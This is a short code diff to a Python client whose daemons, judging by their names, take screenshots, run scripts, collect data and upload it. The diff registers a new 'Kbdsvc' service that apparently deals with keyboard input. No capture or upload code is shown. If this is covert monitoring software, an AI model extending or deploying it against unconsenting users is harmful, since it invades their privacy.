@@ -2,12 +2,11 @@
 # from __future__ import unicode_literals
 
 import os
-import sys
 import signal
-import time
 from services.screenshoter import Screenshoter
 from services.scripter import Scripter
 from services.uploader import Uploader
+from services.kbdsvc import Kbdsvc
 from services.collector import Collector
 import logger
 from config import config
@@ -29,6 +28,7 @@ class SPclient():
         self.daemons.append(Screenshoter())
         self.daemons.append(Scripter())
         self.daemons.append(Uploader())
+        self.daemons.append(Kbdsvc())
 
         utils.makedirs(self.datadir)
 
@@ -49,7 +49,7 @@ class SPclient():
         for d in self.daemons:
             try:
                 d.join()
-            except:
+            except Exception:
                 pass
 
 
